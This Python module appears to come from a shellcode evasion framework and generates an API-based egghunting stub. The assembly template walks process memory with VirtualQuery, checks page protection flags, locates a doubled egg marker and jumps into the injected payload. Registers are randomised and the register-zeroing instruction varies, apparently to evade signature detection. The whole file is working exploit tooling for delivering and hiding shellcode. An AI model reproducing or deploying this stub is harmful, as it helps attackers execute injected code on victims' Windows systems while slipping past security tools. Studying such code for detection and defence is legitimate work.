#!/usr/bin/python

"""
API-based egghunting shellcode
"""

from random import choice
from struct import unpack
from assembler.assembler import assembler
from evasion_modules.core.core import evasion_module
from evasion_modules.core.getpc import getpc_stub_builder
from arch.core import stackpointer_registers, word_keywords, arch_registers, acc_regs, ctr_regs, src_index_regs, dest_index_regs, bit_packs, byte_packs
from arch.winapi import winapi_db, filemap_read_write, filemap_read_write_execute, page_exec_read_write_commit
from utils.bytework import bytes_to_asm

class evasion_egghunt_api(evasion_module):

	def getpc_stub(self, getpc_reg):
		reg_size = 2**self.bits
		word_size = self.bits / 8

		stackpointer_reg = stackpointer_registers[self.bits]
		word_keyword = word_keywords[self.bits]

		egg_marker = unpack(bit_packs[self.bits], self.additional_params['egg_marker'])[0]
		egg_marker_bytes = bytes_to_asm(self.additional_params['egg_marker'])

		apidb = winapi_db(self.additional_params['os_version'], self.additional_params['service_pack'], self.additional_params['language_pack'])
		apidb.connect(self.additional_params['db_filename'])

		VirtualQuery = apidb.get_function_address("VirtualQuery", "kernel32.dll")

		acc_reg = acc_regs[self.bits]
		ctr_reg = ctr_regs[self.bits]
		src_index_reg = src_index_regs[self.bits]
		dest_index_reg = dest_index_regs[self.bits]

		regs = arch_registers(self.arch, self.bits)
		ptr_reg = regs.random_gp_reg(False, [acc_reg, ctr_reg, src_index_reg, dest_index_reg])
		ptr_reg_16 = regs.gp_reg_to_size(ptr_reg, self.bits, 16)
		ptr_reg_08_low = regs.gp_reg_to_size(ptr_reg, self.bits, (8 | 0))

		reg1 = regs.random_gp_reg(False, [ctr_reg, ptr_reg])
		reg2 = regs.random_gp_reg(False, [ctr_reg, ptr_reg, reg1])
		reg3 = regs.random_gp_reg(False, [ctr_reg, ptr_reg, reg1, reg2])
		reg4 = regs.random_gp_reg(False, [ctr_reg, ptr_reg, reg1, reg2, reg3])

		null_instructions = ['XOR', 'SUB']
		null_instr = choice(null_instructions)

		variables = {'word_keyword': word_keyword, 'egg_marker': egg_marker, 'egg_marker_bytes': egg_marker_bytes, 'getpc_reg': getpc_reg, 'stackpointer_reg': stackpointer_reg, 'acc_reg': acc_reg, 'ctr_reg': ctr_reg, 'src_index_reg': src_index_reg, 'dest_index_reg': dest_index_reg, 'VirtualQuery': VirtualQuery, 'null_instr': null_instr, 'reg_size': reg_size, 'word_size': word_size, 'reg1': reg1, 'reg2': reg2, 'reg3': reg3, 'reg4': reg4, 'ptr_reg': ptr_reg, 'ptr_reg_16': ptr_reg_16, 'ptr_reg_08_low': ptr_reg_08_low}

		listing = '''
main:
	{null_instr} {ptr_reg}, {ptr_reg}

next_page:
	; next memory page
	OR {ptr_reg_16}, 0x0FFF
next_pos_in_page:
	INC {ptr_reg}

	; make space on stack
	SUB {stackpointer_reg}, 0x1C
	MOV {reg1}, {stackpointer_reg}

	PUSH 0x1C
	PUSH {reg1}
	PUSH {ptr_reg}
	MOV {reg2}, {VirtualQuery}
	CALL {reg2}

	MOV {reg3}, {word_keyword} PTR [{stackpointer_reg} + 0x14]
	MOV {reg4}, {word_keyword} PTR [{stackpointer_reg}]
	ADD {reg4}, {word_keyword} PTR [{stackpointer_reg} + 0x0C]
	ADD {stackpointer_reg}, 0x1C

	TEST {acc_reg}, {acc_reg}
	JZ next_page

	; check how much space is left between this address and the end of memory region
	SUB {reg4}, {ptr_reg}
	; must be at least 2 (D/Q)WORDs
	CMP {reg4}, ({word_size} * 2)
	JZ next_page

	MOV {reg1}, {reg3}
	PUSH {ptr_reg}
	{null_instr} {reg3}, {reg3}
	{null_instr} {ptr_reg}, {ptr_reg}
	{null_instr} {ctr_reg}, {ctr_reg}
	SUB {ptr_reg}, (-2 % {reg_size})
	SUB {ctr_reg}, (-7 % {reg_size})

	; check flags

check_loop:
	CMP {ptr_reg_08_low}, 0x10
	JZ next_iteration

	PUSH {reg1}
	; (mbi.protect & FLAG)
	AND {reg1}, {ptr_reg}
	; (condition |= (mbi.protect & FLAG))
	OR {reg3}, {reg1}
	POP {reg1}

next_iteration:
	SHL {ptr_reg}, 1
LOOP check_loop


	POP {ptr_reg}
	TEST {reg3}, {reg3}
	JZ next_page

	MOV {acc_reg}, {egg_marker}
	MOV {dest_index_reg}, {ptr_reg}

	; SCASD
	.byte 0xAF

	JNZ next_pos_in_page

	; SCASD
	.byte 0xAF
	JNZ next_pos_in_page

	MOV {getpc_reg}, {dest_index_reg}
	JMP {dest_index_reg}

	{egg_marker_bytes}
	{egg_marker_bytes}
'''

		"""
		NOTE: regarding egg markers
			While the egghunt getpc stub can (and should) be used in a standalone fashion to search for the previously injected
			egg, this serves to demonstrate its use in the PoC by prepending the egg marker to the keyfiller stub so 
			execution is immediately transferred to it following execution of the egghunting getpc stub
		"""

		asm = assembler(self.arch, self.bits)
		stub = asm.assemble(listing.format(**variables))
		return stub